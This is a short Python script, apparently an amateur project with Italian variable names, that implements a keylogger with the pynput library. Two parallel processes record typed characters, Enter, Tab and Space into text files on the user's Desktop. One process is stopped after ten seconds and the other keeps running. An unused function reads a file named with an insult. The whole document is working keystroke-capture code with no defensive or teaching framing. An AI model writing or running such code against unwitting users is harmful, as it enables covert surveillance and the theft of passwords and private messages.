from multiprocessing import Process
from time import sleep

def func1():
    import pynput
    from pynput.keyboard import Key, Listener
    from pathlib import Path

    percorso = Path.home() / "Desktop" / "Scri.txt"

    alfabeto = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZè+òàù,.-é*ç°§;:_[]@#{}1234567890"

    def on_press(key):
        file = percorso.open("a")
        inserimento = "{0}".format(key)
    ##    print(inserimento)
        if inserimento[1] in alfabeto:
            if "Key" not in inserimento:
              file.write(inserimento[1])
            else:
                if inserimento == "Key.enter" or inserimento == "Key.tab":
                    file.write("\n" + inserimento + "\n")
                elif inserimento == "Key.space":
                    file.write(" ")
    def on_release(key):
        return True

    with Listener(on_press = on_press, on_release = on_release) as listener:
        listener.join()

def func2():
    import pynput
    from pynput.keyboard import Key, Listener
    from pathlib import Path

    percorso = Path.home() / "Desktop" / "Scritto.txt"

    alfabeto = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZè+òàù,.-é*ç°§;:_[]@#{}1234567890"

    def on_press(key):
        file = percorso.open("a")
        inserimento = "{0}".format(key)
    ##    print(inserimento)
        if inserimento[1] in alfabeto:
            if "Key" not in inserimento:
              file.write(inserimento[1])
            else:
                if inserimento == "Key.enter" or inserimento == "Key.tab":
                    file.write("\n" + inserimento + "\n")
                elif inserimento == "Key.space":
                    file.write(" ")
    def on_release(key):
        return True

    with Listener(on_press = on_press, on_release = on_release) as listener:
        listener.join()
def func3():
    file = open("Stronzo.txt")
    file.read()
    file.close()
if __name__ == "__main__":
    p1 = Process(target = func1)
    p1.start()
    p2 = Process(target = func2)
    p2.start()
    sleep(10)
    p1.terminate()
